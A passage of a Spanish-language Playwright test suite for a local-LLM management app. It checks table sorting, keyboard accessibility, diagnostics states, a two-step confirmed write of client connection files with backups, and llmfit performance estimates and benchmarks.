  const notas = await page.$$eval("tbody tr td:nth-last-child(2)", (ts) => ts.map((x) => parseFloat(x.innerText.trim().replace(",", "."))));
  for (let i = 1; i < notas.length; i++) {
    if (Number.isFinite(notas[i - 1]) && Number.isFinite(notas[i]) && notas[i - 1] < notas[i]) {
      fallo(`la nota no va de mayor a menor: ${notas}`);
    }
  }
  await pulsar(page, 'th:has(button:text-is("Params")) button');
  if ((await ariaSort(page, "Params")) !== "descending") fallo("Params no ordena descendente");
  const paramsDesc = await page.$$eval("tbody tr td:nth-child(2)", (ts) => ts.map((x) => parseFloat(x.innerText)));
  for (let i = 1; i < paramsDesc.length; i++) {
    if (paramsDesc[i - 1] < paramsDesc[i]) fallo(`params no va de mayor a menor: ${paramsDesc}`);
  }
  await pulsar(page, 'th:has(button:text-is("Params")) button');
  if ((await ariaSort(page, "Params")) !== "ascending") fallo("el segundo clic no invirtió Params");
  const paramsAsc = await page.$$eval("tbody tr td:nth-child(2)", (ts) => ts.map((x) => parseFloat(x.innerText)));
  if (JSON.stringify(paramsAsc) !== JSON.stringify([...paramsDesc].reverse())) {
    fallo(`params asc no es el inverso de desc: ${paramsAsc} vs ${[...paramsDesc].reverse()}`);
  }
  const nulos = await page.$$eval("tbody tr td:nth-last-child(2)", (ts) => ts.filter((x) => x.innerText.trim() === "—").length);
  return `nota desc al abrir · Params desc/asc reales (${paramsDesc.length} filas, ${nulos} sin nota)`;
});

/* 11. Con teclado: se llega a todo y el foco se ve -------------------------- */
await t("11. Con teclado: el salto lleva al contenido y las cabeceras se alcanzan", async () => {
  // Recarga para partir de un foco limpio (el punto de partida del tabulador
  // secuencial se queda donde lo dejó el test anterior si no se recarga).
  await page.goto(URL_APP, { waitUntil: "load" });
  await page.waitForSelector('nav[aria-label="Secciones"]');
  await page.keyboard.press("Tab");
  const primero = await page.evaluate(() => ({
    tag: document.activeElement?.tagName,
    texto: document.activeElement?.innerText?.trim(),
    contorno: getComputedStyle(document.activeElement).outlineWidth,
  }));
  if (primero.texto !== "Saltar al contenido") fallo(`el primer Tab fue a ${primero.texto}`);
  if (primero.contorno === "0px") fallo("el foco no se ve (outline 0)");

  await page.keyboard.press("Enter");
  await page.waitForTimeout(150);
  const donde = await page.evaluate(() => ({ id: document.activeElement?.id, tag: document.activeElement?.tagName }));
  if (donde.id !== "contenido") fallo(`Enter en el enlace de salto dejó el foco en ${donde.id || donde.tag}`);

  // Las cabeceras de la tabla son botones: se alcanzan con Tab y ordenan con Enter.
  await irA(page, "En disco");
  const alcanzable = await page.evaluate(() => {
    const b = document.querySelector('th button');
    b.focus();
    return document.activeElement === b;
  });
  if (!alcanzable) fallo("las cabeceras ordenables no se pueden enfocar");
  await page.keyboard.press("Enter");
  await page.waitForTimeout(150);
  const ordenado = await page.evaluate(() => document.querySelector('[aria-sort="ascending"]')?.innerText.trim());
  if (ordenado !== "Nombre") fallo(`Enter en la cabecera no ordenó: ${ordenado}`);
  return `primer Tab = enlace de salto (outline ${primero.contorno}) · Enter lleva a #contenido · Enter en un th ordena por ${ordenado}`;
});

/* 12. Diagnóstico: los cuatro estados, ordenados y con su remedio ---------- */
await t("12. Diagnóstico: 4 estados por texto+icono, lo que falla primero", async () => {
  await irA(page, "Diagnóstico");
  // Se comprueba sola al abrir la sección: bajo demanda, pero sin obligar a un
  // clic para ver algo. NUNCA en bucle (eso se mide más abajo).
  await esperar(page, () => document.body.innerText.includes("Van bien"), "el resumen del diagnóstico");

  const resumen = await page.evaluate(() => {
    const c = [...document.querySelectorAll("#contenido .card")].find((d) => d.innerText.includes("Van bien"));
    return c?.innerText.split("\n")[0].trim() ?? "";
  });
  for (const trozo of ["Van bien 1 de 4", "1 con problema", "1 con aviso", "1 sin comprobar"]) {
    if (!resumen.includes(trozo)) fallo(`el resumen no dice "${trozo}": ${resumen}`);
  }

  // Las filas se buscan DENTRO de la tarjeta del diagnóstico del entorno: la
  // sección tiene ahora también la tarjeta de autorreparación, con sus propias
  // filas, y contarlas todas juntas mediría otra cosa (eso lo comprueba la 36).
  const filas = await page.evaluate(() => {
    const c = [...document.querySelectorAll("#contenido .card")].find((d) =>
      d.innerText.includes("Van bien"),
    );
    if (!c) return [];
    return [...c.querySelectorAll("ul > li")].map((li) => {
      const ins = li.querySelector("span.rounded-full");
      return {
        texto: li.innerText.replace(/\s+/g, " "),
        estado: ins?.innerText.trim() ?? "",
        tono: ins?.className ?? "",
        iconos: li.querySelectorAll("svg").length,
      };
    });
  });
  if (filas.length !== 4) fallo(`se esperaban 4 comprobaciones, hay ${filas.length}`);
  const orden = filas.map((f) => f.estado).join(" | ");
  if (orden !== "problema | aviso | sin comprobar | todo bien") fallo(`orden inesperado: ${orden}`);
  // Estado por TEXT0 + ICONO + color: si faltara el texto o el icono, se
  // distinguiría solo por color (lo que DESIGN §2 prohíbe).
  if (filas.some((f) => f.iconos === 0)) fallo("alguna comprobación no lleva icono");
  if (new Set(filas.map((f) => f.tono)).size !== 4) fallo("los cuatro estados no se distinguen por tono");

  // El remedio va SOLO donde hay algo que arreglar, y se ve (no en un `title`).
  // Ojo: el rótulo va en mayúsculas por el CSS, y `innerText` devuelve lo que se
  // ve ("CÓMO ARREGLARLO").
  const problema = filas.find((f) => f.estado === "problema");
  const aviso = filas.find((f) => f.estado === "aviso");
  const ok = filas.find((f) => f.estado === "todo bien");
  if (!problema.texto.includes("CÓMO ARREGLARLO") || !problema.texto.includes("cargo install llmfit")) {
    fallo(`el problema no enseña su remedio: ${problema.texto}`);
  }
  if (!aviso.texto.includes("CÓMO ARREGLARLO") || !aviso.texto.includes("mclk-guard.sh")) {
    fallo(`el aviso no enseña su remedio: ${aviso.texto}`);
  }
  if (ok.texto.includes("CÓMO ARREGLARLO")) fallo("una comprobación correcta no debe traer remedio");

  // Bajo demanda: el botón lanza UNA comprobación, y cambiar de sección y volver
  // no la relanza sola.
  const n1 = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "diagnostico:comprobar").length);
  await pulsar(page, 'button:text-is("Comprobar ahora")');
  await esperar(
    page,
    () => [...document.querySelectorAll("button")].some((b) => b.innerText.trim() === "Comprobar ahora"),
    "que termine la comprobación",
  );
  const n2 = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "diagnostico:comprobar").length);
  if (n2 !== n1 + 1) fallo(`el botón lanzó ${n2 - n1} comprobaciones, se esperaba 1`);
  await irA(page, "Inicio");
  await irA(page, "Diagnóstico");
  await page.waitForTimeout(900);
  const n3 = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "diagnostico:comprobar").length);
  if (n3 !== n2) fallo(`al volver a la sección se comprobó ${n3 - n2} veces sin pulsar nada (¿bucle?)`);

  return `4 estados (problema→aviso→sin comprobar→todo bien) con texto+icono+color, resumen "1 de 4", remedio solo donde toca, y 1 comprobación por clic sin bucle`;
});

/* 13. Conexiones: evidencia, frontera y escritura en 2 pasos ---------------- */
await t("13. Conexiones: evidencia, frontera y escritura en 2 pasos", async () => {
  await irA(page, "Conexiones");
  await esperar(page, () => !!document.querySelector("#clientes-conectados"), "el panel de clientes");

  const sec = () => page.evaluate(() => document.querySelector("#clientes-conectados")?.innerText ?? "");
  const texto = await sec();
  // La etiqueta de la sección va en mayúsculas por el CSS: se comprueba tal cual.
  if (!texto.toUpperCase().includes("CLIENTES CONECTADOS")) fallo("falta la etiqueta de la sección");

  // La frontera tiene que LERSE, no ser una nota al pie: dónde se escribe, con
  // qué garantías, y dónde NO se toca nada.
  for (const trozo of [
    "solo escribe donde el formato está comprobado",
    "vuelve a leer el fichero para comprobarlo",
    "En los demás clientes no se toca nada",
  ]) {
    if (!texto.includes(trozo)) fallo(`falta el aviso de frontera ("${trozo}")`);
  }

  // Los CINCO clientes, con sus situaciones distintas: los que apuntan a local, el
  // que existe y no apunta, y el que no está en este equipo.
  for (const trozo of [
    "gentle-shell (Pi)",
    "configuración encontrada",
    "apunta a local",
    "Pi (~/.pi)",
    "Claude Code",
    "MiniMax Code (mcode)",
    "no apunta a local",
    "no tiene ninguna línea que mencione un endpoint local",
    "Codex",
    "sin configuración",
    "no existe en este equipo",
  ]) {
    if (!texto.includes(trozo)) fallo(`el panel de clientes no dice "${trozo}"`);
  }

  // La evidencia: las líneas REALES, legibles (son la prueba).
  const evidencia = await page.evaluate(() => {
    const s = document.querySelector("#clientes-conectados");
    const pre = s?.querySelector("pre");
    return pre ? { texto: pre.innerText, mono: getComputedStyle(pre).fontFamily } : null;
  });
  if (!evidencia) fallo("no se pinta la evidencia de ningún cliente");
  if (!evidencia.texto.includes('"baseUrl": "http://127.0.0.1:8080/v1",')) {
    fallo(`la evidencia no trae las líneas reales: ${JSON.stringify(evidencia.texto)}`);
  }
  if (!evidencia.texto.includes('"apiKey": "local",')) fallo("la evidencia está resumida, no tal cual");

  // Un botón de generar por cliente que ADMITE propuesta, ni uno más: ahora son
  // dos (gentle-shell y Pi), porque los dos usan el mismo formato JSON.
  const botonesGenerar = await page.$$eval("button", (bs) =>
    bs.filter((b) => b.innerText.includes("Generar bloque")).length,
  );
  if (botonesGenerar !== 2) fallo(`hay ${botonesGenerar} botones de generar, se esperaban 2`);

  // Se genera con unos valores DISTINTOS a los de fábrica: así se ve que lo que
  // se enseña sale de lo que se pide, y no de un texto fijo.
  const antes = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "conexiones:propuesta").length,
  );
  // El valor de fábrica del campo de modelos, ANTES de tocar nada: tiene que
  // incluir lo que el cliente ya tiene declarado aunque el servidor no lo
  // publique (si no, aplicar la propuesta borraría configuración sin pedirlo).
  const porDefecto = await page.$eval("#prop-gentle-shell-modelos", (t) => t.value);
  if (!porDefecto.includes("mimo-9b-fast")) {
    fallo(`el formulario no propone un modelo ya declarado: ${JSON.stringify(porDefecto)}`);
  }

  await page.fill("#prop-gentle-shell-endpoint", "http://127.0.0.1:9000/v1");
  await page.fill("#prop-gentle-shell-modelos", "modelo-27b, mimo-9b");
  await pulsar(page, 'button:text-is("Generar bloque")');
  const props = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "conexiones:propuesta").map((l) => l.args),
  );
  if (props.length !== antes + 1) fallo(`se pidieron ${props.length - antes} propuestas, se esperaba 1`);
  const enviado = props.at(-1)?.args ?? {};
  if (enviado.cliente !== "gentle-shell" || enviado.endpoint !== "http://127.0.0.1:9000/v1") {
    fallo(`los argumentos no llevan lo pedido: ${JSON.stringify(enviado)}`);
  }
  if (JSON.stringify(enviado.modelos) !== JSON.stringify(["modelo-27b", "mimo-9b"])) {
    fallo(`los modelos no se parten bien: ${JSON.stringify(enviado.modelos)}`);
  }

  // El bloque generado se busca DENTRO de la tarjeta de gentle-shell (subiendo
  // desde su campo de endpoint), no como «el último `pre` del panel»: con cinco
  // clientes, el último `pre` es la evidencia de otro.
  const bloque = await page.evaluate(() => {
    const s = document.querySelector("#clientes-conectados");
    const pres = [...(s?.querySelectorAll("pre") ?? [])];
    // El bloque generado es el único `pre` que es JSON (empieza por `{`): las
    // evidencias de los demás clientes son líneas de YAML o TOML.
    const pre = pres.find((p) => p.innerText.trim().startsWith("{"));
    return pre ? { texto: pre.innerText, mono: getComputedStyle(pre).fontFamily } : null;
  });
  if (!bloque) fallo("no se pintó el bloque generado");
  for (const trozo of ["http://127.0.0.1:9000/v1", "modelo-27b", "mimo-9b"]) {
    if (!bloque.texto.includes(trozo)) fallo(`el bloque generado no trae "${trozo}": ${bloque.texto}`);
  }
  if (!/Fira Code|mono/i.test(bloque.mono)) fallo(`el bloque no va en monoespaciada: ${bloque.mono}`);
  if (!bloque.texto.includes('"providers"')) fallo("el bloque no trae la clave `providers` del formato real");
  if (!(await sec()).includes("El fichero COMPLETO como quedaría")) fallo("no se enseña el resumen de la propuesta");
  // Y es JSON válido, con lo que se pidió dentro (no un texto fijo).
  const parseado = await page.evaluate(() => {
    const s = document.querySelector("#clientes-conectados");
    // El bloque generado es el `pre` que es JSON (los demás son evidencias).
    const pre = [...s.querySelectorAll("pre")].find((p) => p.innerText.trim().startsWith("{"));
    try {
      const j = JSON.parse(pre.innerText);
      const p = j.providers?.local;
      const provs = Object.keys(j.providers ?? {});
      return {
        ok: true,
        baseUrl: p?.baseUrl,
        models: p?.models ?? [],
        apiKey: p?.apiKey,
        provs,
        // Del proveedor que ya existía: su modelo tiene que seguir ENTERO.
        conservado: j.providers?.["modelo-local-local"]?.models?.[0]?.contextWindow,
      };
    } catch (e) {
      return { ok: false, error: String(e) };
    }
  });
  if (!parseado.ok) fallo(`el bloque no es JSON válido: ${parseado.error}`);
  if (parseado.baseUrl !== "http://127.0.0.1:9000/v1") {
    fallo(`el bloque no lleva el endpoint pedido: ${parseado.baseUrl}`);
  }
  // El formato REAL: `models` son OBJETOS, no una lista de nombres.
  if (!Array.isArray(parseado.models) || !parseado.models.every((m) => m && typeof m === "object")) {
    fallo(`los modelos no van como objetos: ${JSON.stringify(parseado.models)}`);
  }
  const ids = parseado.models.map((m) => m.id);
  if (JSON.stringify(ids) !== JSON.stringify(["modelo-27b", "mimo-9b"])) {
    fallo(`el bloque no lleva los modelos pedidos: ${JSON.stringify(ids)}`);
  }
  // Y los que YA estaban declarados conservan sus metadatos: si esto fallara,
  // cambiar el endpoint de un proveedor borraría el contexto de sus modelos.
  for (const m of parseado.models) {
    if (m.contextWindow !== 262144) {
      fallo(`el modelo ${m.id} perdió su contexto: ${JSON.stringify(m)}`);
    }
  }
  if (parseado.conservado !== 262144) fallo("el proveedor que ya existía perdió los metadatos de su modelo");
  if (!parseado.provs.includes("modelo-local-local")) {
    fallo(`el fichero propuesto se ha cargado los otros proveedores: ${JSON.stringify(parseado.provs)}`);
  }
  if (parseado.apiKey !== "local") fallo(`la clave local no es la del backend: ${parseado.apiKey}`);

  // Copiar: o copia, o lo deja seleccionado y lo dice. Nunca miente.
  await pulsar(page, 'button:text-is("Copiar")');
  await page.waitForTimeout(200);
  const feedback = await page.evaluate(() => {
    const s = document.querySelector("#clientes-conectados");
    return [...(s?.querySelectorAll('[role="status"]') ?? [])].map((e) => e.innerText).join(" | ");
  });
  if (!/Copiado al portapapeles|pulsa Ctrl\+C/.test(feedback)) {
    fallo(`el botón de copiar no dice qué ha pasado: ${JSON.stringify(feedback)}`);
  }

  // ── Escribir: dos pasos, y NADA se escribe hasta el segundo ──────────────
  const escriturasAntes = await page.evaluate(
    () => window.__LLAMADAS__.filter((l) => l.cmd === "conexiones:aplicar").length,
  );
  await pulsar(page, 'button:text-is("Escribir en gentle-shell (Pi)…")');
  await page.waitForTimeout(150);
  const trasPrimerClic = await page.evaluate(
    () => window.__LLAMADAS__.filter((l) => l.cmd === "conexiones:aplicar").length,
  );
  if (trasPrimerClic !== escriturasAntes) {
    fallo("el primer clic en Escribir ya escribió: tiene que pedir confirmación");
  }
  const confirmacion = await sec();
  for (const trozo of [
    "Se escribirá",
    // El patrón de la copia se anuncia EN la confirmación, antes de escribir, y
    // como patrón (lleva la fecha), no como una ruta que todavía no existe.
    "models.json.bak-AAAAAMMDD-HHMMSS",
    "se dejará el fichero como estaba",
    "Sí, escribir con copia",
    "Cancelar",
  ]) {
    if (!confirmacion.includes(trozo)) fallo(`la confirmación no dice "${trozo}"`);
  }
  // Y el FOCO tiene que estar en el botón de confirmar, no en el aire: al pulsar
  // «Escribir…» ese botón desaparece del árbol y quien navega con teclado se
  // quedaba sin anillo y tenía que tabular para llegar aquí (medido en la app
  // real). Es un paso que escribe en un fichero: el foco se lleva solo.
  const foco = await page.evaluate(() => ({
    etiqueta: document.activeElement?.tagName ?? "",
    texto: (document.activeElement?.innerText ?? "").trim(),
  }));
  // Ojo: comprobar solo `innerText.includes(...)` sería VACUO, porque si el foco
  // se queda en `<body>` su texto contiene la página entera. Hay que exigir que
  // el elemento enfocado SEA el botón.
  if (foco.etiqueta !== "BUTTON" || foco.texto !== "Sí, escribir con copia") {
    fallo(`el foco no está en el botón de confirmar: <${foco.etiqueta}> "${foco.texto.slice(0, 40)}"`);
  }
  // Y el nombre accesible tiene que EMPEZAR por el texto visible (WCAG 2.5.3):
  // si no, quien navega por voz no puede decir «pulsa Sí, escribir con copia».
  const nombreAccesible = await page.evaluate(
    () => document.activeElement?.getAttribute("aria-label") ?? "",
  );
  if (process.env.DIAG) {
    console.log("DIAG foco:", await page.evaluate(() => document.activeElement?.outerHTML?.slice(0, 260) ?? "nada"));
  }
  if (!nombreAccesible.startsWith("Sí, escribir con copia")) {
    fallo(`el nombre accesible no empieza por el texto visible: "${nombreAccesible}"`);
  }

  // El segundo paso es el que escribe, con LOS MISMOS argumentos que se revisaron.
  await pulsar(page, 'button:text-is("Sí, escribir con copia")');
  await page.waitForTimeout(250);
  const enviados = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "conexiones:aplicar").map((l) => l.args.args),
  );
  if (enviados.length !== 1) fallo(`se aplicó ${enviados.length} veces, se esperaba 1`);
  const escrito = enviados[0] ?? {};
  if (escrito.endpoint !== "http://127.0.0.1:9000/v1") {
    fallo(`se escribió otro endpoint del que se revisó: ${JSON.stringify(escrito)}`);
  }
  if (JSON.stringify(escrito.modelos) !== JSON.stringify(["modelo-27b", "mimo-9b"])) {
    fallo(`se escribieron otros modelos de los que se revisaron: ${JSON.stringify(escrito.modelos)}`);
  }

  // El resultado: la copia y la comprobación, a la vista.
  const resultado = await sec();
  for (const trozo of [
    "Escrito y comprobado",
    "models.json.bak-20260927-094500",
    "Sí, comprobado releyendo el fichero",
  ]) {
    if (!resultado.includes(trozo)) fallo(`el resultado no enseña "${trozo}"`);
  }
  // Y se vuelve a detectar: los distintivos de arriba no pueden quedarse viejos.
  const redes = await page.evaluate(
    () => window.__LLAMADAS__.filter((l) => l.cmd === "conexiones:clientes").length,
  );
  if (redes < 2) fallo(`tras escribir no se volvió a detectar (${redes} detecciones)`);

  // El rechazo del backend se enseña LITERAL, sin envolver: se vacía la lista de
  // modelos (el generador exige al menos uno) y se vuelve a pedir.
  await page.fill("#prop-gentle-shell-modelos", "");
  await pulsar(page, 'button:text-is("Generar bloque")');
  const rechazo = await page.evaluate(() =>
    document.querySelector("#clientes-conectados")?.innerText ?? "",
  );
  if (!rechazo.includes("hace falta al menos un modelo para el proveedor")) {
    fallo(`no se enseña el motivo del rechazo: ${rechazo.slice(0, 200)}`);
  }

  // Y la frontera: NINGÚN otro fichero se toca. Solo se escribe donde el formato
  // está comprobado (gentle-shell) y solo al confirmar.
  const otras = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) =>
      ["settings:set", "servers:add", "servers:update", "servers:remove", "model:remove"].includes(l.cmd),
    ).length,
  );
  if (otras !== 0) fallo(`el panel de clientes tocó ${otras} cosas que no debía`);

  return `3 clientes (con evidencia / sin líneas / sin fichero) · aviso de frontera visible · bloque JSON real: fichero completo, modelos como OBJETOS con su contexto conservado (${enviado.endpoint}, 2 modelos) · copia anunciada · escritura en 2 pasos con 0 escrituras al primer clic y los mismos argumentos · resultado con la copia · rechazo literal · 1 escritura, la confirmada`;
});

/* 14. Rendimiento · estimación de llmfit: plan, concurrencia y su aviso ----- */
await t("14. Rendimiento · estimación de llmfit: plan, concurrencia y su aviso", async () => {
  await irA(page, "Rendimiento");
  await esperar(page, () => !!document.querySelector("#estimacion-llmfit"), "el bloque de estimación");

  const intro = await page.evaluate(() => document.body.innerText);
  // La frontera dicha con palabras: esto NO es una medición. El rótulo de la
  // sección va en mayúsculas por el CSS, así que se compara en mayúsculas.
  if (!intro.toUpperCase().includes("NO ES UNA MEDICIÓN")) {
    fallo("el bloque de estimación no dice en su rótulo que no es una medición");
  }
  for (const trozo of ["Esto está calculado, no medido", "no se mezcla"]) {
    if (!intro.includes(trozo)) fallo(`la estimación no se distingue con palabras ("${trozo}")`);
  }

  // El plan: el contexto que se escribe tiene que LLEGAR al backend.
  await page.fill("#estim-modelo", "Qwen2.5 32B Instruct");
  await page.fill("#estim-contexto", "65536");
  await pulsar(page, 'button:text-is("Calcular plan")');
  const planes = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "llmfit:plan").map((l) => l.args),
  );
  const argsPlan = planes.at(-1)?.args ?? {};
  if (argsPlan.modelo !== "Qwen2.5 32B Instruct" || argsPlan.context !== 65536) {
    fallo(`el plan no lleva el modelo y el contexto escritos: ${JSON.stringify(argsPlan)}`);
  }
  if ("quant" in argsPlan) fallo("se mandó una cuantización vacía: el hueco opcional debe omitirse");

  const plan = await page.evaluate(() => {
    const s = document.querySelector("#estimacion-llmfit");
    return s?.innerText.replace(/\s+/g, " ") ?? "";
  });
  for (const trozo of [
    "65536",
    "21.4 GB",
    "Qwen",
    "q4_0",
    "GPU · todo en la VRAM",
    "GPU + CPU · capas repartidas",
    "Solo CPU",
    "no cabe",
    "18.2",
    "tok/s (est.)",
    // El aviso de llmfit se enseña cuando viene.
    "Aviso de llmfit sobre sus propios números",
    "por encima de 32768 de contexto los números son menos fiables",
    // VRAM nula en la vía de CPU: "—", no 0.
    "— / 24.0 GB / 8",
  ]) {
    if (!plan.includes(trozo)) fallo(`el plan no enseña "${trozo}": ${plan.slice(0, 300)}…`);
  }

  // La concurrencia: tabla de capacidad, con el 0 dicho en palabras.
  await pulsar(page, 'button:text-is("Calcular concurrencia")');
  const conc = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "llmfit:concurrencia").map((l) => l.args),
  );
  if (conc.at(-1)?.args?.modelo !== "Qwen2.5 32B Instruct") {
    fallo(`la concurrencia no lleva el modelo: ${JSON.stringify(conc.at(-1))}`);
  }
  const capacidad = await page.evaluate(() => {
    const s = document.querySelector("#estimacion-llmfit");
    const tablas = [...(s?.querySelectorAll("table") ?? [])];
    const tabla = tablas.find((t) => t.innerText.includes("Sesiones a la vez"));
    return {
      filas: tabla?.querySelectorAll("tbody tr").length ?? 0,
      texto: (tabla?.innerText ?? "").replace(/\s+/g, " "),
      resumen: s?.innerText.replace(/\s+/g, " ") ?? "",
    };
  });
  if (capacidad.filas !== 4) fallo(`la escalera tiene ${capacidad.filas} escalones, se esperaban 4`);
  if (!capacidad.texto.includes("0 · no cabe ni una")) {
    fallo(`el escalón que no cabe no se dice con palabras: ${capacidad.texto}`);
  }
  for (const trozo of ["14.2 GB", "q4_0", "Sesiones a la vez"]) {
    if (!capacidad.resumen.includes(trozo)) fallo(`la concurrencia no enseña "${trozo}"`);
  }
  // Los tres datos que llmfit da y antes se tiraban. La memoria recurrente es
  // `null` en este modelo, así que NO puede aparecer una fila vacía por ella.
  for (const trozo of ["Contexto nativo del modelo", "262144", "Cuantización del modelo", "Q4_K_M"]) {
    if (!capacidad.resumen.includes(trozo)) fallo(`la concurrencia no enseña "${trozo}"`);
  }
  if (capacidad.resumen.includes("Capas recurrentes")) {
    fallo("se enseña la memoria recurrente cuando el modelo no la tiene");
  }

  return `plan (65536 · 21.4 GB · 3 vías · tok/s «est.» · aviso de llmfit) y escalera de 4 escalones con el 0 en palabras`;
});

/* 15. Rendimiento · medir sirviendo: dos caminos y fila en el histórico ----- */
await t("15. Rendimiento · medir sirviendo: los dos caminos, bien etiquetados", async () => {
  // Las fichas de modelo se pintan cuando llega el inventario: sin esperarlas,
  // la etiqueta del botón de al lado no existiría todavía.
  await esperar(
    page,
    () => !!document.querySelector('button[aria-label^="Medir rendimiento de"]'),
    "las fichas de modelo",
  );
  const texto = await page.evaluate(() => document.body.innerText);
  for (const trozo of [
    "En aislado · llama-bench",
    "Sirviendo · llmfit bench",
    "no son comparables",
  ]) {
    if (!texto.includes(trozo)) fallo(`los dos caminos no quedan rotulados ("${trozo}")`);
  }
  // El rótulo de la sección va en mayúsculas por el CSS: se comprueba tal cual.
  const rotuloMedir = await page.evaluate(() =>
    (document.querySelector("#medicion-servidor")?.innerText ?? "").toUpperCase(),
  );
  if (!rotuloMedir.includes("MEDIR SIRVIENDO")) {
    fallo(`la sección de medir sirviendo no lleva su rótulo: ${rotuloMedir.slice(0, 80)}`);
  }
  const etiquetaMedir = await page.$eval('button[aria-label^="Medir rendimiento de"]', (b) =>
    b.getAttribute("aria-label"),
  );
  if (!etiquetaMedir.includes("en aislado")) {
    fallo(`el botón por modelo no dice que mide en aislado: ${etiquetaMedir}`);
  }

  // La lista de modelos sale del INVENTARIO (única fuente), no de la foto, y
  // solo con los .gguf de TEXTO: los de ComfyUI/piper no se pueden encajar ni
  // medir con llama.cpp, así que no se pintan aquí.
  const fichas = await page.$$eval('button[aria-label^="Medir rendimiento de"]', (bs) =>
    bs.map((b) => b.getAttribute("aria-label")),
  );
  if (fichas.length !== 6) fallo(`se esperaban 6 modelos de texto, hay ${fichas.length}`);
  const grid = await page.evaluate(() => {
    const s = [...document.querySelectorAll("#contenido section")].find((x) =>
      x.innerText.toUpperCase().includes("MODELOS DE TEXTO EN DISCO"),
    );
    return s?.innerText.replace(/\s+/g, " ") ?? "";
  });
  if (!grid.toUpperCase().includes("ENCAJE Y VELOCIDAD EN AISLADO (6)")) {
    fallo(`la sección no dice cuántos son ni que mide en aislado: ${grid.slice(0, 120)}`);
  }
  if (!grid.includes("18.1 GB")) fallo(`el tamaño no sale del inventario (19.4e9 bytes → 18.1 GB)`);
  if (/sdxl-base|wan2\.2|es_ES-sharvard|mmproj/.test(grid)) {
    fallo("la lista incluye modelos que no son de texto para encaje/medición");
  }

  // Sin modelo ni «todos» no se lanza NADA: se avisa antes.
  const n0 = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "action:run").length);
  await pulsar(page, 'button:text-is("Medir contra el servidor")');
  const n1 = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "action:run").length);
  if (n1 !== n0) fallo("se lanzó una medición sin modelo ni «todos los del servidor»");
  if (!(await page.evaluate(() => document.body.innerText.includes("no hay nada que medir")))) {
    fallo("no se avisa de que falta el modelo");
  }

  // Con modelo: el contrato exacto, y el resultado al histórico.
  await page.fill("#medir-modelo", "modelo-27b");
  await pulsar(page, 'button:text-is("Medir contra el servidor")');
  const llamadas = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "action:run").map((l) => l.args),
  );
  const esperado = {
    aj: {
      kind: "llmfit:medir",
      args: { modelo: "modelo-27b", provider: "llamacpp", runs: 3, todos: false },
    },
  };
  if (JSON.stringify(llamadas.at(-1)) !== JSON.stringify(esperado)) {
    fallo(`los argumentos no son los del contrato: ${JSON.stringify(llamadas.at(-1))}`);
  }
  if (!(await page.evaluate(() => document.body.innerText.includes("41.2 tok/s")))) {
    fallo("no se enseña el resultado de la medición");
  }

  await esperar(
    page,
    () => document.body.innerText.includes("llmfit (llamacpp)"),
    "la fila de la medición en el histórico",
  );
  const historial = await page.evaluate(() => {
    const tabla = [...document.querySelectorAll("#contenido table")].find((t) =>
      t.innerText.includes("no son comparables"),
    );
    return [...(tabla?.querySelectorAll("tbody tr") ?? [])].map((tr) =>
      tr.innerText.replace(/\s+/g, " "),
    );
  });
  if (historial.length !== 2) fallo(`el histórico tiene ${historial.length} filas, se esperaban 2`);
  if (!historial[0].includes("llmfit (llamacpp)") || !historial[0].includes("41.2")) {
    fallo(`la medición no entró en el histórico: ${historial[0]}`);
  }
  // Y la frontera, EN LA TABLA: una medida sirviendo no se lee junto a una de
  // llama-bench en aislado.
  if (!historial[1].includes("llama-bench") || !historial[1].includes("no comparable")) {
    fallo(`la fila de llama-bench debería marcarse no comparable: ${historial[1]}`);
  }

  // «Todos los del servidor»: no se manda modelo, se manda --all y sube otra fila.
  await page.click("#medir-todos");
  await pulsar(page, 'button:text-is("Medir contra el servidor")');
  const llamadas2 = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "action:run").map((l) => l.args),
  );
  const esperadoTodos = {
    aj: { kind: "llmfit:medir", args: { provider: "llamacpp", runs: 3, todos: true } },
  };
  if (JSON.stringify(llamadas2.at(-1)) !== JSON.stringify(esperadoTodos)) {
    fallo(`«todos» no manda lo que debe: ${JSON.stringify(llamadas2.at(-1))}`);
  }
  await esperar(
    page,
    () => document.body.innerText.toUpperCase().includes("MEDIDAS GUARDADAS (3)"),
    "la tercera fila del histórico",
  );

  return `dos caminos rotulados · validación sin modelo (0 acciones) · contrato exacto por modelo y con «todos» · la fila del proxy se marca no comparable con la de llama-bench`;
});

/* 16. Una sola regla numérica: punto decimal y sin coma en fecha/hora -------- */
await t("16. Una sola regla numérica: punto decimal, sin coma en fecha/hora", async () => {
  const fila = await page.evaluate(() => {
    const tabla = [...document.querySelectorAll("#contenido table")].find((t) =>
      t.innerText.includes("no son comparables"),
    );
    const primera = tabla?.querySelector("tbody tr");
    return [...(primera?.querySelectorAll("td") ?? [])].map((td) => td.innerText.trim());
  });
  // Fecha y hora, separadas por un espacio: la coma del `toLocaleString` de
  // es-ES ya no está. El año no aparece (igual que antes).
  if (!/^\d{2}\/\d{2} \d{2}:\d{2}$/.test(fila[0] ?? "")) {
    fallo(`la fecha/hora no sigue la regla (sin coma): ${JSON.stringify(fila[0])}`);
  }
  // Cifras con punto decimal.
  if (!/^\d+\.\d+ ± \d+\.\d+$/.test(fila[4] ?? "")) {
    fallo(`los tok/s no usan punto decimal: ${JSON.stringify(fila[4])}`);
  }
  // Y en general: ni una sola cifra con coma decimal en lo que se ve.
  const conComa = await page.evaluate(() => {
    const m = document.body.innerText.match(/\d,\d/g);
    return m ? m.slice(0, 5) : [];
  });
  if (conComa.length > 0) fallo(`hay cifras con coma decimal en Rendimiento: ${conComa}`);

  // El mismo criterio en Diagnóstico, donde el detalle lo redacta el backend
  // (con `{:.1}`, punto) y se enseña TAL CUAL: los dos coinciden.
  await irA(page, "Diagnóstico");
